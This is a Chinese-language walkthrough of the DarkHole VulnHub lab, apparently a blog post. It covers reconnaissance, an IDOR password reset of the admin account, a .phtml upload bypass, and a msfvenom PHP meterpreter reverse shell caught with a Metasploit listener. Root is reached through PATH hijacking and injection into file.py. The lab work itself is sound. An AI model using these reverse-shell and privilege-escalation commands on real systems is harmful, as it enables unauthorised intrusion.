Darkhole靶场实战记录

前言

靶场下载地址：https://download.vulnhub.com/darkhole/darkhole.zip
将靶场布置到与kali机同一网段下,开始进行渗透

一、信息收集

1.主机探测

在kali机中输入：netdiscover -r 目标主机所在网段

可以发现同网段下有一台靶机有VMware标记

2.资产扫描

在kali机中输入：nmap -sV 靶机IP -v

根据图片中的信息发现该主机开放了22端口和80端口，可以考虑SSH登录和HTTP访问

我们先访问80端口的网站，结果如下

一番探索后发现右上角有一个login的登陆页面，接下来我们将针对这个页面进行渗透

二、漏洞利用

1. 寻找可利用信息

访问login页面，先尝试几个常见的弱口令比如root,admin
简单的弱口令行不通我们用burpsuite抓取登录数据包，使用集束炸弹模式进行字典爆破

对爆破结果分析后发现依旧行不通，此时发现登录页面下有一个注册窗口

接下来的思路是我们自己注册一个账号并抓取注册数据包分析

依旧没有什么有利信息

我们使用刚刚注册的账号登录，发现有两个表单窗口用来更新个人信息

此时观察浏览器中的url发现我们使用的当前用户id=2
我们可以推测id=1的账号是管理员账号
修改url中的id=1,尝试访问

发现这个靶场对这种水平越权方式进行了限制
接下来我们回到自己账户的页面尝试修改密码的功能，依旧进行抓包

我们尝试更改数据包中的id=1,尝试能否修改id=1账户的密码

放包发现修改成功

此时我们已经知道了id=1的账户的密码，我们再去抓包尝试爆破用户名
可以轻易的得到账户名admin
成功登录

2.利用文件上传漏洞

先试着随便上传几个文件，发现对图片后缀进行了限制
但是可以上传后缀为phtml的文件
在Apache的配置文件会把.phtml文件作为php文件解析处理，所以可以利用这个漏洞

我们可以在kali机中生成一个反向TCP的shell
使用msfvenom工具指令生成一个PHP格式的反向TCP后门木马

指令：msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP地址 lport=端口号 -f raw -o /shell.php

我们将php的后缀改为phtml上传到靶机中
显示上传成功，我们点击名为File的链接，直接访问上传的文件

之后我们就可以去kali机上进行监听，使用命令msfconsole
msf > use exploit/multi/handler
msf > set payload php/meterpreter/reverse_tcp
msf > set lhost kali机IP
msf > set lport 端口号
msf > run

再返回浏览器重新访问一下网站，回到kali机发现成功连接上后台

三、提权

1.寻找可利用信息

输入shell进入cmd
优化界面:python3 -c ‘import pty; pty.spawn(“/bin/bash”)’

接下来我们反复使用 cd.. 和 ls 命令 寻找config这类敏感文件

这里我们发现了一个用户信息john
我们进入/home/john下寻找信息

这里进行尝试过后发现只对toto有操作的权限
我们用指令./toto执行

我们可以发现执行的结果和指令id的结果一致，于是我们接下来的渗透思路便是环境变量提权

2.环境变量劫持

再kali机上按照以下顺序执行：
cd /tmp (进入tmp目录,tmp是 Linux 系统的临时目录，默认所有用户都有读写执行权限)

touch id (在/tmp目录下创建一个名为id的空文件,目的是为了冒充原生命令)

echo “/bin/bash” > id (将字符串/bin/bash写入到/tmp/id文件中,让这个伪造的id文件执行后直接启动 bash shell)

chmod 777 id (给/tmp/id文件设置最高权限)

export PATH=/tmp:$PATH (修改系统的PATH环境变量，将/tmp目录放到PATH最前端)

cd /home/john
./toto

如上图当我们获取到权限之后可以发现一个root123的密码
其实到这一步我们也只是拿下了John的权限

3.提权

我们可以利用john文件下的file.py进行提权
使用指令在file.py中添加代码

echo “import os;os.system(‘/bin/bash’)” > /home/john/file.py

执行以上命令代码中的os.system(‘/bin/bash’)被执行，启动一个root权限的 bash shell
我们会获得一个 root 身份的命令行终端的权限，且无密码限制，就能直接提权到 root

四、总结

这个靶场打下来给我一种强烈的一环扣一环的感觉，作者在每一步都设计的刚刚好，这个靶场相对于BTRsys-2来说是要更难一些的，在渗透过程中作者设置了很多的过滤校验限制，有一种最后不得不走这一条路的感觉。不过这个靶场打完也拓宽了我的渗透思路，对工具的使用也更加熟练。
